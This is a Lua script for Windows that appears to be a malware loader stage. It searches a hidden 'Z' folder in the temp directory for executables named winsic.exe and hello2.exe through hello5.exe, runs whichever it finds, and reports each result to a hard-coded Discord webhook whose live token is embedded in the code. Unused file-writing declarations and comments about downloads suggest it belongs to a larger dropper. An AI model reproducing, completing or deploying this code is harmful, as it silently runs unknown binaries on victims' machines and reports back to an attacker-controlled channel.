-- Load necessary libraries
local ffi = require("ffi")
local https = require("ssl.https")
local ltn12 = require("ltn12")
local json = require("json")

-- Define necessary Windows API functions and constants
ffi.cdef[[
    typedef void* HANDLE;
    typedef int BOOL;
    typedef unsigned long DWORD;
    typedef void* LPVOID;
    HANDLE CreateFileA(const char* lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, void* lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
    BOOL WriteFile(HANDLE hFile, const void* lpBuffer, DWORD nNumberOfBytesToWrite, DWORD* lpNumberOfBytesWritten, void* lpOverlapped);
    BOOL CloseHandle(HANDLE hObject);
]]

-- Constants for file creation and access
local GENERIC_WRITE = 0x40000000
local CREATE_ALWAYS = 2

-- Function to generate a random string
local function generateRandomString(length)
    local charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local str = ""
    math.randomseed(os.time())
    for _ = 1, length do
        local randomIndex = math.random(1, #charset)
        str = str .. charset:sub(randomIndex, randomIndex)
    end
    return str
end

-- Function to check if a file exists
local function fileExists(filePath)
    local file = io.open(filePath, "rb")
    if file then
        file:close()
        return true
    else
        return false
    end
end

-- Function to create a directory if it doesn't exist
local function createDirectoryIfNotExists(dirPath)
    if not fileExists(dirPath) then
        os.execute('mkdir "' .. dirPath .. '"')
    end
end

-- Function to write binary data to a file and execute it
local function writeAndExecuteBinary(filePath)
    -- Check if the file exists after download
    if not fileExists(filePath) then
        return "File does not exist: " .. filePath
    end

    -- Execute the file using os.execute
    local executeCommand = '"' .. filePath .. '"'
    local result = os.execute(executeCommand)

    if result == 0 then
        return "File executed successfully: " .. filePath
    else
        return "Error executing file: " .. filePath
    end
end

-- Function to send a message to a Discord server using a webhook
local function sendToDiscord(webhookUrl, message)
    local payload = json.encode({content = message})
    local _, code = https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = #payload
        },
        source = ltn12.source.string(payload)
    }
    return code
end

-- Main logic
local tempDir = os.getenv("TEMP") or os.getenv("TMP") or "C:\\Temp"
local zDir = tempDir .. "\\Z"

-- Create Z directory if it doesn't exist
createDirectoryIfNotExists(zDir)

-- List of expected filenames
local exeFiles = {
    zDir .. "\\winsic.exe",
    zDir .. "\\hello2.exe",
    zDir .. "\\hello3.exe",
    zDir .. "\\hello4.exe",
    zDir .. "\\hello5.exe"
}

local discordWebhookUrl = "https://discordapp.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2" -- Replace with your actual Discord webhook URL

-- Check for each file and execute if it exists
for _, exeFilePath in ipairs(exeFiles) do
    if fileExists(exeFilePath) then
        local executionResult = writeAndExecuteBinary(exeFilePath)
        sendToDiscord(discordWebhookUrl, executionResult)
    else
        local errorMsg = "File does not exist: " .. exeFilePath
        sendToDiscord(discordWebhookUrl, errorMsg)
    end
end
